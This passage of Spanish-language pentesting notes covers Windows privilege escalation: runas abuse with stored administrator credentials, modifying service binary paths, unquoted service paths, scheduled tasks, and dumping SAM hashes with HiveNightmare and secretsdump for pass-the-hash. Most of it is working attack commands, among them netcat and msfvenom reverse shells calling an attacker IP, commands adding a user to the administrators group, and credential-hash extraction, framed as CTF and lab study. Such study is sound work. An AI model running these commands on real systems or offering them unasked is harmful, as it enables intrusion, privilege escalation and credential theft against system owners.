ejecucion de comandos:

```bash
Invoke-Tater -Trigger 1 -Command "comando"
```

## Runas

Es posible que un usuario (justo el administrador) tenga las credenciales almacenadas en el sistema operativo, esto lo podemos comprobar con:

```bash
cmdkey /list


#OUTPUT

Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Comandos como runas (run as) nos permiten ejecutar algo como un cierto usuario, tiene un parametro **/savecred** que si le indicamos el usuario que tiene las claves almacenadas, no permite ejecutar cosas como ese usuario.

Vimos que las credenciales del usuario administrador estan almacenadas, podemos aprovecharnos de esto:

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"

runas /savecred /user:Administrator "cmd.exe /k whoami"
```

## Modifiable Services

Cuando se instala un programa, se agregan nuevas subclaves al registro que contiene valores específicos vinculados a ese programa, es decir, su ubicación, versión, tipo de servicio y ruta ejecutable.

Estas claves son modificables únicamente por los administradores. Cualquier configuración incorrecta en los permisos de la ACL del registro puede permitir que un usuario estándar (con privilegios bajos) modifique la configuración de un servicio.

Es posible que por mala configuracion nosotros podamos modificar un servicio (WriteData o CreateFiles). WinPEAS nos puede indicar que servicios podriamos modificar:

```bash
daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
```

Puedes comprobar los permisos sobre un servicio con:

```bash
accesschk.exe -ucqv <Service_Name>
```

Puede descargar el accesschk.exe de este link [accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

Se recomienda comprobar si los "Usuarios autenticados" pueden modificar algún servicio:

```bash
.\accesschk.exe /accepteula -uwcqv <nombre de usuario actualde windows> <servicio>

accesschk.exe -uwcqv "Authenticated Users" * /accepteula

accesschk.exe -uwcqv %USERNAME% * /accepteula

accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul

accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

En este ejemplo el servicio es **daclsvc**.

si esto nos muestra **SERVICE_CHANGE_CONFIG** es que podemos modificar parametros del servicio, si muestra **SERVICE_START** es que podemos iniciar el servicio y si muestra **SERVICE_STOP** es que lo podemos parar.

otra forma de comprobar los servicios es mediante powershell:

```bash
Get-Acl -Path hklm:\System\CurrentControlSet\services\ | format-list
```

podemos hacerlo mas legible con esto:

```bash
$acl = get-acl HKLM:\SYSTEM\CurrentControlSet\Services

ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
```

Los servicios tiene un valor llamado **BINARY_PATH_NAME**, podemos ver el contenido de ese valor con:

```bash
sc qc <service name>

#OUTPUT

...
...
BINARY_PATH_NAME : "C:ºProgram Files\DACL Service\daclservice.exe"
...


```

Ese path se ejecuta cuando el servicio se ejecuta y es asi como sabe que programa ejecutar ese servicio, pero como tenemos permisos para cambiar la configuracion de ese servicio podemos actualizar el valor de ese parametro para que cuando se inicie el servicio se ejecute algo que nosotros queramos: 

```bash
sc config <service name> binpath="payload"
```

si nos pasamos netcat a la maquina podemos usar uno de estos ejemplos.

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"

sc config <Service_Name> binpath= "net localgroup administrators username /add"

sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

o

```bash
Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\<service> -name ImagePath -value "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
```

Ahora es solo cuestion de parar y volver a iniciar el servicio para que se ejecute nuestro payload:

```bash
net stop <service name> && net start <service name>
```

https://medium.com/r3d-buck3t/abuse-service-registry-acls-windows-privesc-f88079140509

## Unquoted Service Path

Siguiendo con el tema del path de un servicio pasa lo siguiente, Si el path tiene contenido con espacios y estos no estan entre dobles comillas ocurre esto:

supongamos que la ruta de un servicio es la siguiente:

```bash
C:\Program Files\Some Folder\Service.exe
```

se puede ver que tiene espacios entre los nombres de los directorios, esto deberia ir entre dobles comillas porque windows lo interpreta de la siguiente manera:

```bash
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```

Podemos enumerar los servicios que puedan ser vulnerables a esto de la siguiente manera:

```bash
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

Powersploit tiene una función la cual nos sirve para enumerar servicios que tengan un “Unquoted Service Path” y un espacio en alguna carpeta. Una vez tenemos PowerUp.ps1 cargado en la powershell, podemos hacer uso del siguiente cmdlet:

```bash
Get-UnquotedService
```

una vez identificado un servicio vulnerable, debemos verificar dos cosas:

- Si podempos iniciar o detener el servicio.
- Si tenemos permisos de escritura en alguna de las posibles carpetas vulnerables.

Esto se puede hacer con **accesschk**:

**IDENTIFICAR SI PODEMOS INICIAR O DETENER EL SERVICIO**

```bash
accesschk.exe /accepteula -ucqv <usuario> <servicio>
```

asi podemos comprobar que permisos tiene un usuario en particular sobre un servicio.

- **/accepteula**: la primera vez que lo hacemos suele salir una ventana gráfica de aceptar términos y demás. Para no tener problemas desde nuestra shell, añadiendo directamente este argumento aceptamos los términos desde la propia consola.
- **-u** :  Indicamos que no enseñe los errores si los hubiese
- **-c**: Indicamos que el `<nombre de objeto>` representa un servicio de Windows.
- **-q**: Quitamos el banner de la herramienta del output
- **-v**: Típico verbose de cualquier herramienta

los permisos necesarios para iniciar o detener un servicio son: **SERVICE_START** y **SERVICE_STOP**.

**IDENTIFICAR PERMISOS DE ESCRITURA EN DIRECTORIOS**

Necesitamos permisos de escritura en alguno de los directorio vulnerables, por ejemplo de estos:

```bash
C:\Program.exe -> permisos en C:\
C:\Program Files\Some.exe -> permisos en C:\Program Files
C:\Program Files\Some Folder\Service.exe -> permisos en C:\Program Files\Some Folder
```

para ello usaremos la misma herramienta:

```bash
accesschk.exe /accepteula -uwdq <path>

#RW BUILTIN/users #esto indica que el los usuarios normales pueden editar
```

- **-u** :  Indicamos que no enseñe los errores si los hubiese
- **-w**: enseña solo los permisos que tengan escritura
- **-q**: Quitamos el banner de la herramienta del output
- **-d**: Indicamos que el objeto es una carpeta. Y que nos interesa los permisos de este objeto y no los de su contenido.

¿Cómo nos aprovechamos de esto? Facil, solo cree una reverse shell con msfvenom en formato .exe, renombrelo como Program.exe o Some.exe. (Se debe tener permisos de escritura en la ruta C:\ o C:\Program Files\) y reinicie el servicio.

De esta manera engañaremos al servico para que encuentre nuestro peyload.

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.25 LPORT=4545 -f exe-service -o service.exe
```

A la escucha en la maquina Kali:

```bash
nc -lvnp 4545
```

paramos y levantamos nuevamente el servicio:

```bash
net stop service

net start service
```

PRACTICAR: [https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)

## Tareas Programadas

Se puede utilizar de la siguiente manera para ver todas las tareas existentes:

```bash
schtasks /query /fo LIST /v
```

tambien lo podemos hacer con powershell:

```bash
Get-ScheduledTask | ft TaskName,TaskPath,State
```

podemos excluir las tareas predeterminadas de windows:

```bash
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

si tenemos permisos en el path de alguna tarea programada, podemos aprovecharnos de eso, verificar permisos en el path:

```bash
accesschk.exe /accepteula -quvw <usuario> <Path>
```

si podemos modificar lo que ejecute la tarea programada o crear algo.

[https://steflan-security.com/windows-privilege-escalation-scheduled-tasks/](https://steflan-security.com/windows-privilege-escalation-scheduled-tasks/)

## ROBAR HASH CON SERIOUS SAM

Usaremos el repositorio de [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare) donde partiendo de un usuario sin privilegios podremos leer la SAM y hacer un pass the hash.

Nos descargamos el .exe y lo pasamos a la maquina windows 10 o 11. [HiveNightmare.exe](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe)

lo ejecutamos:

```bash
HiveNightmare.exe
```

Y en el mismo lugar donde se encuentra el ejecutable nos extraera una copia de la SAM, SYSTEM y SECURITY que contiene los hashes NTLM de los usuarios. Esos archivos los movemos a nuestra maquina kali y con **secretsdump** podemos hacer un dumpeo.

```bash
python3 secretssdump.py -sam SAM-FILE -system SYSTEM-FILE -security SECURITY-FILE
```

Y ya contaremos con los hashes para realizar un ataque de pass the hash.


